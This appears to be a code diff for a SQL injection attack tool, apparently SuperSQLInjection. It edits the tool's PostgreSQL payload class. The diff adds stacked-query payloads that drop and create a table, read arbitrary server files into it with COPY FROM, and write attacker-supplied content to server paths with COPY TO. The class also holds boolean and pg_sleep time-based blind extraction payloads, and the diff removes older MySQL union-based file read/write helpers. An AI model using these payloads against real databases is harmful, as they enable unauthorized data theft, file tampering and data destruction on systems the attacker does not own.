@@ -11,7 +11,7 @@ namespace SuperSQLInjection.payload
         public static String path = "config/vers/postgresql.txt";
         public static List<String> vers = FileTool.readFileToList(path);
 
-        public static String char_length = "(select char_length({data}))";
+        public static String char_length = "(char_length({data}))";
         
         //数据库数量
         public static String dbs_count = "(select count(distinct(schemaname)) from pg_tables)";
@@ -34,6 +34,8 @@ namespace SuperSQLInjection.payload
 
         public static String bool_value = "ascii(substring(cast({data} as text),{index},1))";
 
+        public static String bool_data = " {data}>{len}";
+
         public static String substr_one_value = "(substring(cast({data} as text),{index},1))";
 
         //获取数据库数量bool方式
@@ -54,6 +56,9 @@ namespace SuperSQLInjection.payload
 
         //bool方式获取值
         public static String ver_value = " "+ bool_value + ">{len}";
+
+        //bool方式获取值
+        public static String char_length_val = " " + char_length + ">{len}";
 
         //bool方式获取值
         public static String bool_ord_value = " " + substr_one_value + ">{len}";
@@ -80,6 +85,24 @@ namespace SuperSQLInjection.payload
 
         public static String substr_value = "(select substr({data},{start},{len}))";
 
+        public static String readFile = " 1=1;drop table if exists ssqlinjection;create table ssqlinjection(data text);copy ssqlinjection from '{path}';--";
+
+        public static String createTable = " 1=1;drop table if exists ssqlinjection;create table ssqlinjection (data text);--";
+
+        public static String insertLineValue = " 1=1;insert into ssqlinjection(data) values ('{content}');--";
+
+        public static String writeFile = " 1=1;copy ssqlinjection(data) to '{path}';--";
+
+
+        public static String drop_table = " 1=1;drop table if exists ssqlinjection;--";
+
+
+        public static String file_content = "(select data from ssqlinjection)";
+        public static String file_content_Count = "(select count(1) from ssqlinjection)";
+        public static String file_content_data = "(select data from ssqlinjection offset {index} limit 1)";
+
+
+
         public static String getBoolDataBySleep(String data,int maxTime)
         {
             return " 1=(case when ((" + data + ")>{len}) then (select 1 from pg_sleep(" + maxTime + ")) else 1 end)";
@@ -89,6 +112,8 @@ namespace SuperSQLInjection.payload
         {
             return " 1=(case when ((" + data + ")) then (select 1 from pg_sleep(" + maxTime + ")) else 1 end)";
         }
+
+        
 
 
         /// <summary>
@@ -108,46 +133,17 @@ namespace SuperSQLInjection.payload
             return error_value.Replace("{data}", d);
         }
 
-       
-
-        public static String creatMySQLReadFileByUnion(int columnsLen, int showIndex,String fill,String data)
+        public static String getReadFilePayload(String path)
         {
-            StringBuilder sb = new StringBuilder();
-            for (int i = 1; i <= columnsLen; i++)
-            {
-
-                if (i == showIndex)
-                {
-                    sb.Append(concatMySQLColumn(data) + ",");
-                }
-                else
-                {
-
-                    sb.Append(fill+",");
-                }
-            }
-            return sb.Remove(sb.Length - 1, 1).ToString();
+            return readFile.Replace("{path}", path);
         }
-
-        public static String creatMySQLWriteFileByUnion(int columnsLen, int dataIndex,String fill, String path,String content)
+        public static String getInsertLineValue(String content)
         {
-            StringBuilder sb = new StringBuilder(" 1=1 union select ");
-            for (int i = 1; i <= columnsLen; i++)
-            {
-
-                if (i == dataIndex)
-                {
-                    sb.Append(Tools.strToHex(content,"UTF-8")+",");
-                }
-                else
-                {
-
-                    sb.Append(fill+",");
-                }
-            }
-            sb.Remove(sb.Length - 1, 1);
-            sb.Append(" into dumpfile '"+path+"'");
-            return sb.ToString();
+            return insertLineValue.Replace("{content}", content);
+        }
+        public static String getWriteFilePayload(String path)
+        {
+            return writeFile.Replace("{path}", path);    
         }
         public static String getUnionDataValue(int columnsLen, int showIndex, String dataPayLoad, String dbname, String table, String index)
         {
@@ -167,6 +163,9 @@ namespace SuperSQLInjection.payload
             sb.Remove(sb.Length - 1, 1);
             return union_value.Replace("{data}", sb.ToString());
         }
+
+
+
         public static String getUnionDataValue(int columnsLen, int showIndex, List<String> columns, String dbname, String table, String index)
         {
             StringBuilder sb = new StringBuilder();
@@ -208,7 +207,17 @@ namespace SuperSQLInjection.payload
             return data;
         }
 
-
+        /// <summary>
+        /// 反射条调用，加载显示支持的文件操作
+        /// </summary>
+        /// <returns></returns>
+        public static List<String> getShowCanDoFile()
+        {
+            List<String> list = new List<String>();
+            list.Add("PostgreSQL Copy写文件");
+            list.Add("PostgreSQL Copy读文件");
+            return list;
+        }
 
     }
 }
